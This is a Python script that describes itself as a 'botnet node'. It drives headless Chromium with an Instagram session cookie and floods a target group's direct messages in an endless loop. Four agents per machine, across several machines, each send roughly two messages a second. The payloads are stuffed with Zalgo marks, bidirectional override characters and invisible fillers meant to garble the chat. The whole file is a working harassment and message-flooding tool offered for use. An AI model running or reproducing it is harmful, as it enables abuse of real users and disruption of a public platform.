# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (MATRIX BOTNET NODE)
# 📅 STATUS: MULTI-MACHINE | 20-MPS | TOTAL-OVERLOAD

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- NODE CONFIG ---
AGENT_COUNT = 4  # 4 agents per machine x 5 machines = 20 total
# --------------------

def get_variant_payload(agent_id):
    """Generates unique payloads to prevent browser optimization."""
    u_id = random.randint(100000, 999999)
    glue = "\u2060"
    
    # Variance: Each agent uses a different mathematical style
    styles = [
        ("𝕻", "𝕬", "𝕻", "𝕬"), # Fraktur
        ("ℙ", "𝔸", "ℙ", "𝔸"), # Double-Struck
        ("𝓟", "𝓐", "𝓟", "𝓐"), # Script
        ("Ｐ", "Ａ", "Ｐ", "Ａ")  # Full-Width
    ]
    s = styles[agent_id % len(styles)]
    
    header = f"👑_{s[0]}{s[1]}{s[2]}{s[3]}_ＰＡＰＡ_👑{glue}☣️_NODE_{os.environ.get('MACHINE_ID')}_☣️{glue}🆔_{u_id}{glue}"
    
    # Variance: Different Zalgo densities per agent
    z_tower = "̸" * random.randint(160, 200)
    void_fill = "\u2800" * random.randint(30, 50)
    
    body = []
    for i in range(150):
        # Variance: Staggered BIDI sequences
        bidi = ["\u2067\u202E", "\u2068\u202B", "\u202E\u2066"][i % 3]
        body.append(f"{bidi}{s[0]}{s[1]}{s[2]}{s[3]}_ＯＷＮＳ_{void_fill}{z_tower}\u202C\u2069")
        
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    page = await context.new_page()
    strike_count = 0
    
    async def sync():
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Syncing Node...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
        box = page.get_by_role("textbox", name="Message")
        await box.wait_for(state="visible", timeout=60000)
        return box

    try:
        box = await sync()
        while True:
            payload = get_variant_payload(agent_id)
            await box.fill(payload)
            await page.keyboard.press("Enter")
            strike_count += 1
            print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Strike {strike_count}")
            
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            if strike_count >= 15:
                strike_count = 0
                box = await sync()

    except Exception:
        await page.close()

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
